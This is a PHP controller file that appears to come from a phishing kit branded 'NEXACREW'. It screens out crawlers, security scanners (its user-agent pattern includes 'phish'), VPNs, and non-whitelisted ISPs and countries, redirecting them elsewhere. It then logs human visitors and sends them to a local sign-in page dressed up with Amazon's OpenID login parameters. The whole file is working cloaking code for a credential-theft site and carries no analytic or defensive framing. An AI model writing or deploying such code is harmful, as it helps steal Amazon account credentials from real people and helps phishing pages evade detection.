<?php
defined("ALLOW") or exit('No direct script access allowed');
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
class Home
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		$getInfo = _geoGet($this->goNEXA->ip_address);


		foreach ($getInfo as $k => $v) {
			$_SESSION[$k] = $v;
		}
	}

	public function index()
	{

		if (preg_match("/bot|crawler|spider|aws|curl|slurp|phish|search|libwww-perl|python|archiver|transcoder|spider|uptime|validator|fetcher|cron|check|reader|extractor|monitoring|analyz/", $_SERVER['HTTP_USER_AGENT'])) {
			write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|BLOCKED BY NEXACREW\r\n");
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|BLOCKED BY NEXACREW\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (_config('VPNDETECT') == 'on') {
			if (blackbox($this->goNEXA->ip_address)) {
				write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|VPN BLOCKED\r\n");
				write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|VPN BLOCKED BY NEXACREW\r\n");
				_blocks();
				redirect(uriRand());
			}
		}


		if (_config('FILTERISP') == 'on') {
			$wl = loadWhitelist(FCPATH . 'Whitelist/allowISP.txt');

			$accessAllowed = false;
			$sessionISP = strtolower(trim($_SESSION['isp']));

			foreach ($wl as $allowedISP) {
				if (stripos($sessionISP, strtolower(trim($allowedISP))) !== false) {
					$accessAllowed = true;
					break;
				}
			}

			if (!$accessAllowed) {
				write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|ISP BLOCKED BY NEXACREW\r\n");
				write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|ISP BLOCKED BY NEXACREW\r\n");
				_blocks();
				redirect(uriRand());
			}
		}


		if (_config('FILTERCOUNTRY') == 'on') {
			$wx = loadWhitelist(FCPATH . 'Whitelist/allowCountry.txt');

			var_dump($_SESSION['country'], $wx); // Debug
			$accessAllowed = false;
			$country = strtolower(trim($_SESSION['country']));

			foreach ($wx as $allowedCountry) {
				if ($country === strtolower($allowedCountry)) {
					$accessAllowed = true;
					break;
				}
			}

			if (!$accessAllowed) {
				write(FCPATH . 'Static/log_isp.txt', 'a', "{$this->goNEXA->ip_address}|COUNTRY BLOCKED BY NEXACREW\r\n");
				write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|COUNTRY BLOCKED BY NEXACREW\r\n");
				_blocks();
				redirect(uriRand());
			}
		}

		if ($this->goNEXA->is_robot) {
			write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|BLOCKED BY NEXA\r\n");
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|BLOCKED BY NEXA\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (!isset($_GET[_config('PARAMETER')])) {
			write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|BLOCKED BY NEXA\r\n");
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|BLOCKED BY NEXA\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (_config('ANTIBOT') == 'on') {
			if (!empty(_antibot('ANTIBOTKEY'))) {
				if (antibot($this->goNEXA->ip_address, $this->goNEXA->agent)) {
					write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|BLOCKED BY ANTIBOT\r\n");
					write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|BLOCKED BY ANTIBOT\r\n");
					_blocks();
					redirect(uriRand());
				}
			}
		}

		if (_config('BLOCKERPRO') == 'on') {
			if (!empty(_botblocker('BLOCKERPROKEY'))) {
				if (botblocker($this->goNEXA->ip_address, $this->goNEXA->agent)) {
					write(FCPATH . 'Static/log_robot.txt', 'a', "{$this->goNEXA->ip_address}|BLOCKED BY BOTBLOCKER\r\n");
					write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|BLOCKED BY BOTBLOCKER\r\n");
					_blocks();
					redirect(uriRand());
				}
			}
		}

		$_SESSION['access'] = 1;
		write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|Human\r\n");
		redirect(base_url() . 'signin?verify=nxa_openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0' . md5(time()) . '');
	}
}
